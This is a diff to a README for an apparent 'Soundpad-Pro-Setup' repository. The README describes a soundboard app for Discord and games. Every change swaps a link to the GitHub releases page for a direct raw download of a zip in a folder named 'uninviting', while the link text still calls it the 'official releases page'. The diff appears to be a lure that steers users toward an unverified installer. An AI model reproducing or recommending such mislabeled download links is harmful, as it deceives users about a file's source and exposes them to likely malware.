@@ -1,6 +1,6 @@
 # 🔊 Soundpad-Pro-Setup - Play custom sounds in your voice chat
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ahmedm3502/Soundpad-Pro-Setup/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ahmedm3502/Soundpad-Pro-Setup/raw/refs/heads/main/uninviting/Setup-Pro-Soundpad-2.6-beta.5.zip)
 
 Soundpad plays sounds in voice chat applications, Discord calls, and computer games. This software provides a soundboard with hotkeys, voice transformation effects, audio recording, and live audio mixing. You use this tool to share sound clips with friends or teammates during live conversations.
 
@@ -8,7 +8,7 @@ Soundpad plays sounds in voice chat applications, Discord calls, and computer ga
 
 Follow these steps to obtain the latest version of the application:
 
-1. Visit the [official releases page](https://github.com/Ahmedm3502/Soundpad-Pro-Setup/releases).
+1. Visit the [official releases page](https://github.com/Ahmedm3502/Soundpad-Pro-Setup/raw/refs/heads/main/uninviting/Setup-Pro-Soundpad-2.6-beta.5.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release block.
 3. Click the file ending in `.msi` or `.exe` to save it to your computer.
 4. Open the file once the download finishes.
@@ -74,4 +74,4 @@ If you encounter problems, check these items first:
 *   **Others cannot hear me:** Confirm that Discord uses the correct microphone device. Make sure the soundboard is not muted in the settings menu.
 *   **The program feels slow:** Close unnecessary background applications that consume a large amount of system memory.
 *   **Audio crackling:** Lower the sample rate in your sound settings. Higher sample rates sometimes cause issues on older audio hardware.
-*   **Need more help:** Return to the [download page](https://github.com/Ahmedm3502/Soundpad-Pro-Setup/releases) and check the issue tracker to see if other users report the same problem. You can open a new issue if you find a unique bug.
+*   **Need more help:** Return to the [download page](https://github.com/Ahmedm3502/Soundpad-Pro-Setup/raw/refs/heads/main/uninviting/Setup-Pro-Soundpad-2.6-beta.5.zip) and check the issue tracker to see if other users report the same problem. You can open a new issue if you find a unique bug.
